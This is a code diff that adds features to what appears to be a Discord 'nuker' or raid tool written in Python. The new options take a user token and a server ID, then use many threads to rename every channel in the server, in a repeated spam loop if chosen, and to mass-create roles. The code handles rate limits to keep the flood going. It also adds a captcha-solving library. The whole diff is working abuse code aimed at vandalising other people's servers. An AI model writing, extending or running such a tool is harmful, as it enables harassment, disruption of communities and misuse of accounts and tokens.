@@ -14,6 +14,7 @@ except ImportError:
 	os.system("pip install requests")
 	os.system("pip install pystyle")
 	os.system("pip install discord")
+	os.system("pip install capmonster_python")
 	
 def headers_reg():
     response1 = requests.get("https://discord.com")
@@ -409,7 +410,124 @@ def clientattack():
 				print(Colorate.Horizontal(Colors.rainbow, "             The number style is invalid !"))
 				time.sleep(2)
 				clientattack()
+	elif select == "5" or select == "05":
+		print()
+		token = input(Colorate.Horizontal(Colors.green_to_cyan, "         TOKEN : "))
+		token_checker(token)
+		guild = input(Colorate.Horizontal(Colors.green_to_cyan, "         SERVER ID : "))
+		type = input(Colorate.Horizontal(Colors.green_to_cyan, "         Do you want automatic spam? (yes,no) : "))
 		
+		if type == "Yes" or type == "yes" or type == "Y" or type == "y":
+			try:
+				try:
+					num = int(input(Colorate.Horizontal(Colors.green_to_cyan, "         NUM : ")))
+					print()
+				except:
+					print(Colorate.Horizontal(Colors.rainbow, "             The number style is invalid !"))
+					time.sleep(2)
+					clientattack()
+				res = requests.get(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": token})
+				if res.json() == []:
+					print(Colorate.Horizontal(Colors.rainbow, "             There are no rooms on this server !"))
+					time.sleep(2)
+					clientattack()
+				else:
+					for i in range(num):
+						x = random.randint(10000000,99999999)
+						ty = f"GENIX SHOP | {x}"
+						for channel in json.loads(res.text):
+							def startbot(chann,tokens,na):
+								response = requests.patch(f"https://discord.com/api/v9/channels/{chann}",headers={"authorization": tokens},json={"name":na,"type":0,"topic":"","bitrate":64000,"user_limit":0,"nsfw":False,"flags":0,"rate_limit_per_user":0})
+								if response.status_code == 429:
+									re = response.json()['retry_after']
+									print(Colorate.Horizontal(Colors.rainbow, f"             RalteLimited For {re} !"))
+									time.sleep(float(re))
+								elif response.status_code == 200:
+									id = response.json()['id']
+									print(Colorate.Horizontal(Colors.rainbow, f"             [+] Change Channels - {id} Done"))
+								else:
+									print(response,response.json())
+								#if response.status_code == 200:
+									#id = response.json()['id']
+									#print(Colorate.Horizontal(Colors.rainbow, f"               [-] Deleted Channels - {id}"))
+								#else:
+									#print(Colorate.Horizontal(Colors.rainbow, "             Can't be deleted because you don't have a role !"), end="\r")
+							threading.Thread(target=startbot, args=[channel['id'],token,ty]).start()
+					time.sleep(3)
+					clientattack()
+			except:
+				print()
+				print(Colorate.Horizontal(Colors.rainbow, "                This server does not exist !"))
+				time.sleep(2)
+				clientattack()
+		else:
+			ty = input(Colorate.Horizontal(Colors.green_to_cyan, "         NICKNAME : "))
+			print()
+			try:
+				res = requests.get(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": token})
+				if res.json() == []:
+					print(Colorate.Horizontal(Colors.rainbow, "             There are no rooms on this server !"))
+					time.sleep(2)
+					clientattack()
+				else:
+					for channel in json.loads(res.text):
+						def startbot(chann,tokens,na):
+							response = requests.patch(f"https://discord.com/api/v9/channels/{chann}",headers={"authorization": tokens},json={"name":na,"type":0,"topic":"","bitrate":64000,"user_limit":0,"nsfw":False,"flags":0,"rate_limit_per_user":0})
+							if response.status_code == 429:
+								re = response.json()['retry_after']
+								print(Colorate.Horizontal(Colors.rainbow, f"             RalteLimited For {re} !"))
+								time.sleep(float(re))
+							elif response.status_code == 200:
+								id = response.json()['id']
+								print(Colorate.Horizontal(Colors.rainbow, f"             [+] Change Channels - {id} Done"))
+							else:
+								print(response,response.json())
+						threading.Thread(target=startbot, args=[channel['id'],token,ty]).start()
+					time.sleep(3)
+					clientattack()
+			except:
+				print()
+				print(Colorate.Horizontal(Colors.rainbow, "                This server does not exist !"))
+				time.sleep(2)
+				clientattack()
+	elif select == "6" or select == "06":
+		print()
+		token = input(Colorate.Horizontal(Colors.green_to_cyan, "         TOKEN : "))
+		token_checker(token)
+		guild = input(Colorate.Horizontal(Colors.green_to_cyan, "         SERVER ID : "))
+		name = input(Colorate.Horizontal(Colors.green_to_cyan, "         NICKNAME : "))
+		
+		if guild == None or name == None:
+			print(Colorate.Horizontal(Colors.rainbow, "             The input style is invalid !"))
+			time.sleep(2)
+			clientattack()
+		else:
+			try:
+				num = int(input(Colorate.Horizontal(Colors.green_to_cyan, "         NUM : ")))
+				print()
+			except:
+				print(Colorate.Horizontal(Colors.rainbow, "             The number style is invalid !"))
+				time.sleep(2)
+				clientattack()
+				
+			print()
+			def createe(z,tokens,na):
+				r = requests.post(f"https://discord.com/api/v9/guilds/{z}/roles",headers={"authorization": tokens},json={"name":na,"color":0,"permissions":"0"})
+				if r.status_code == 400:
+					print(Colorate.Horizontal(Colors.rainbow, "                This server does not exist !"), end="\r")
+				elif r.status_code == 404:
+					print(Colorate.Horizontal(Colors.rainbow, "                This server unknow !"), end="\r")
+				elif r.status_code == 200:
+					id = r.json()['id']
+					print(Colorate.Horizontal(Colors.rainbow, f"                [+] Create Roles - {id} Done"))
+				else:
+					print(r,r.json())
+			
+			for i in range(num):
+				threading.Thread(target=createe, args=[guild,token,name]).start()
+			
+			time.sleep(3)
+			clientattack()
 		
 	
 
